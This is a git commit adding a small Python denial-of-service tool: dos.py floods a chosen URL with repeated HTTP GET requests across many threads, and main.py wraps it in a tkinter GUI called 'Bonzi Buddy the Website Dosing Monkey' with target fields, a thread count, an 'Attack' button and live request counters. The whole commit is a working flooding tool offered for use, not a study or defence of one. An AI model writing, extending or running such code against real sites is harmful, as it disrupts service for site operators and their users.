a5456813bc401dd797cd310b844a39ec80144c81
hotpig <micahimaphet@gmail.com>
2022-10-11 21:50:13 -0400

    first commit

---
+++ dos.py
@@ -0,0 +1,63 @@
+import requests
+import threading
+import time
+import random
+import math
+
+continueDos = True
+thread = []
+numRequests = 0
+waitForDos = 1
+threadsinited = 0
+threads = 1
+
+def dos(webPage_):
+    global continueDos, numRequests
+    webPage = str(webPage_)
+    while continueDos:
+        '''
+        The dosing happens here. It is done by
+        requesting the sites html code rappidly. The rest
+        of the code is making it faster via mutliple threads
+        and making the software easier to use
+        '''
+        requests.get(webPage)
+        # print("requested:", webPage)
+        numRequests += 1
+        if (continueDos == False):
+            break
+
+class reqThread (threading.Thread):
+    def __init__(self, webPage):
+        threading.Thread.__init__(self)
+        self.webPage = webPage
+    def run(self):
+        dos(self.webPage)
+
+
+
+# This is the function the threads will be running
+def initThreads(*webPages):
+    global thread, threads, waitForDos, continueDos, numRequests, threadsinited
+    continueDos = True
+    thread = []
+    numRequests = 0
+    threadsinited = 0
+    webPages = webPages[0]
+    # This creates the threads, but does not start it
+    for i in range(threads):
+        print('created Web Page: {} Thread ID: {} Total Threads: {}'.format(webPages, i, len(webPages)))
+        thread.append(reqThread(webPages[i % len(webPages)]))
+    
+    for i in range(waitForDos):
+        print("Starting threads in {}".format(waitForDos - i))
+        time.sleep(1)
+    print("Starting threads")
+
+    # This activates the threads
+    for i in range(threads):
+        thread[i].start()
+        threadsinited+=1
+
+# If you want to call the sequence directly with the function
+# initThreads('https://example.com', 1)
---
+++ main.py
@@ -0,0 +1,93 @@
+from tkinter import * 
+from PIL import ImageTk, Image
+import threading
+
+from numpy import outer
+import dos
+
+win = Tk ()
+win.title("Bonzi Buddy the Website Dosing Monkey")
+win.iconbitmap('C:\\Users\\micah\\Downloads\\hotpig_icon.ico')
+win.geometry('600x400+50+50')
+
+results = Label(win)
+results.place(x=0, y = 400)
+
+def requestDos():
+    global target    
+    dos.threads = int(dosThreads.get())
+    webPages = []
+    for i in range(len(target)):
+        webPages.append(target[i].get())
+    # webPages=webPages[0] # It thinks that it is a list of lists
+    dos.initThreads(webPages)
+    results['text'] = target[0].get()
+
+
+class mainDosThread (threading.Thread):
+    def run(self):
+        requestDos()
+
+maindosthread = mainDosThread()
+
+target = []
+targetLen = 1
+target.append(Entry(win, width=25))
+target[0].insert(0, "https://google.com")
+target[0].place(x=50, y=7)
+
+dosBtn = Button(win, text="Attack", command=maindosthread.start)
+dosBtn.place(x=210, y=5)
+
+my_img = ImageTk.PhotoImage(Image.open("C:\\Users\\micah\\Downloads\\bonzibuddy.png"))
+bonzi = Label(image=my_img)
+bonzi.place(x=300, y=300)
+
+extraInfo = LabelFrame(win, width=170, height=100)
+extraInfo.place(x=380, y=5)
+
+targetExplanation = Label(win, text="Target:")
+targetExplanation.place(x=5, y=5)
+
+dosThreads = Entry(extraInfo, width=5)
+dosThreads.insert(0, 1)
+dosThreads.place(x=60, y=5)
+
+dosThreadsExplanation = Label(extraInfo, text="Threads:")
+dosThreadsExplanation.place(x=5, y=5)
+
+def addTarget():
+    global targetLen, target
+    target.append(Entry(win, width=25))
+    target[targetLen].insert(0, "https://")
+    target[targetLen].place(x=50, y=7 + (20*targetLen))
+    targetLen+=1
+
+addTargetButton = Button(win, text="Add Target", command=addTarget)
+addTargetButton.place(x=300, y=5)
+
+def stop_Dos():
+    dos.continueDos=False
+stopDos = Button(win, text="Stop", command=stop_Dos)
+stopDos.place(x=260, y=5)
+
+dosTracker = Label(extraInfo, text=dos.numRequests)
+dosTracker.place(x=5, y = 25)
+
+threadsCreated = Label(extraInfo, text=len(dos.thread))
+threadsCreated.place(x=5, y=50)
+
+threadsInit = Label(extraInfo, text=len(dos.thread))
+threadsInit.place(x=5, y=75)
+
+class DataTrack (threading.Thread):
+    def run(self):
+        while 1:
+            dosTracker["text"] = "{} requests have been sent".format(dos.numRequests)
+            threadsCreated["text"] = "{} threads have been created".format(len(dos.thread))
+            threadsInit["text"] = "{} threads have been initiated".format(dos.threadsinited)
+
+datatrack = DataTrack()
+datatrack.start()
+
+win.mainloop()
